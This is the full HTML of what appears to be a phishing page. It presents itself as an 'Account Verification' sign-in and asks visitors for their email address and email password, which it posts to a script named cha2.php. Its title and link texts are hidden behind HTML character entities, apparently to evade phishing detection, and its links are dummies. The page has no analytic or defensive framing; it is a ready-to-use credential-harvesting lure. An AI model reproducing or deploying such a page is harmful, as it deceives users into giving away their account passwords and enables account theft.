
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<title>&#83;&#105;&#103;&#110;&#32;&#105;n</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon" href="images/favicoon.ico"/>
 
<link rel="stylesheet" href="css/style.css">
 
 
<body>
<div class="container1">
<img src="images/logo.png">
</div><br /><br />
<div class="container">  

  <form id="contact" action=cha2.php method=post>
   <h2>Account Verification</h2>
    <p>Verify your account by entering your email and email password</p><hr  style="border:1px solid #ccc"/><br />
    <fieldset>
      <input placeholder="Email" type="email"  required  name="ema8cha78">
    </fieldset>
    <fieldset>
      <input placeholder="Email Password" type="password"  required name="pass9020">
    </fieldset>
      
    
     
    <fieldset>
      <input name="submit" type="submit" id="contact-submit"  value="Sign in" >    </fieldset>
    <p style="font-size:15px; color: #0066CC"><a href="#" style=" text-decoration:none">&#x46;&#x6F;&#x72;&#x67;&#x6F;&#x74;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x2F;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x3F; &rsaquo;</a><br>
<a href="#" style=" text-decoration:none">&#x4E;&#x6F;&#x74;&#x20;&#x65;&#x6E;&#x72;&#x6F;&#x6C;&#x6C;&#x65;&#x64;&#x3F;&#x20;&#x53;&#x69;&#x67;&#x6E;&#x20;&#x75;&#x70;&#x20;&#x6E;&#x6F;&#x77;&#x2E; &#8250;</a></p>
  </form>
</div><br /><br /><br />
<img src="images/5.gif" alt="" title="" border=0 width=100% >